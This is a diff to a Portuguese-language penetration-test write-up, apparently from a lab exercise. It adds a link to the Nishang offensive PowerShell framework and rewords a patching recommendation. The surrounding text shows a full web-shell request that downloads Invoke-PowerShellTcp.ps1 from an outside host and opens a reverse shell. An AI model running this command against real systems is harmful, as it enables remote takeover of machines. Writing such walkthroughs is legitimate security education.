@@ -175,6 +175,9 @@ Para obter uma reverse shell mais robusta, utilizei o **Nishang**, um framework 
 
 Utilizei o seguinte comando via shell PHP para executar o payload do Nishang e obter uma reverse shell:
 
+[Nishang - Offensive PowerShell for red team, penetration testing and offensive security.](https://github.com/samratashok/nishang)
+
+
 ```
 http://192.168.185.189:8080/shell.php?cmd=powershell%20-NoP%20-NonI%20-W%20Hidden%20-Exec%20Bypass%20-Command%20IEX(New-Object%20Net.WebClient).DownloadString(%27http://192.168.45.171/Invoke-PowerShellTcp.ps1%27);%20Invoke-PowerShellTcp%20-Reverse%20-IPAddress%20192.168.45.171%20-Port%20443
 ```
@@ -242,7 +245,7 @@ Para evitar que explorações como as descritas acima sejam bem-sucedidas, segue
 
 6. **Implementar Controles de Acesso Granulares**: Utilize mecanismos de controle de acesso para limitar os privilégios de usuários e serviços ao mínimo necessário para realizar suas funções.
 
-7. **Atualizar e Patchar o Sistema Regularmente**: Mantenha o servidor e todos os softwares, como o phpMyAdmin, atualizados com os patches mais recentes para corrigir vulnerabilidades conhecidas.
+7. **Atualizar e Aplicar Patches ao Sistema Regularmente**: Mantenha o servidor e todos os softwares, como o phpMyAdmin, atualizados com as correções de segurança mais recentes para mitigar vulnerabilidades conhecidas.
 
 Implementando essas medidas, você pode reduzir significativamente o risco de compromissos semelhantes no seu ambiente.
 
